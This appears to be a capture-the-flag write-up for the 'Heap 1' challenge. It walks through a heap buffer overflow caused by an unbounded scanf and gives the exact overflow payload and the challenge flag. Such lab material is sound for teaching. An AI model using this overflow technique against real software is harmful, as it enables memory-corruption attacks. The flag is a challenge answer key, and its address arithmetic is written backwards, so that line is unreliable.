## CTF: picoCTF 2024

Challenge: Heap 1

Category: pwn

Points: 15

Difficulty: Intermediate

## Instructions

Can you control your overflow?

## Solution

This challenge just introduces the user to the basics of heap overflows. You're given a file called **chall.** You can run your basic file and checksec to see what's going on in the file.

```bash
amichel2579-academy@webshell:~$ checksec --file=chall
[*] '/home/amichel2579-academy/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
amichel2579-academy@webshell:~$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ff7d337eabb0fe33f42aade12d3bd5c7b0f4201, for GNU/Linux 3.2.0, with debug_info, not stripped
```

We see that it is a 64 bit executable, it has No Pie and it is not stripped. Lets run it to see what happens.

```bash
I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x2562f6b0  ->   pico
+-------------+-----------+
[*]   0x2562f6d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit
```

We see that it is giving us two different addresses and they have the values pico and bico respectiviley. Lets try to understand what is happening so we can rpint the flag.

```bash
int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

```bash

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}
```

```bash
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

We see a few interesting things, first we see we have two global variables, input_data and safe_var. We see that when we call **write_buffer**, we're writing into input_data, and that it's taking all our input with a vulnerable scanf call. Finally, we know that to get our flag, we need safe_var to hold the data pico in it. This means the solution is very simple, figure out how far input_data is from safe_var and then overwrite the data in safe_var so that it reads pico. Lets do some math on our address and then  put our final payload into input_data.

```bash
0x2562f6b0 - 0x2562f6d0 = 32
```

So we need 32 bytes and then the string pico after to get our flag.

```bash

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f345ad972b0  ->   pico
+-------------+----------------+
[*]   0x5f345ad972d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
academy{starting_to_get_the_hang_514bac2b}
```

## Flag

```bash
academy{starting_to_get_the_hang_514bac2b}
```

## Mitigation

Limit the input size of the user so they can't overwrite data.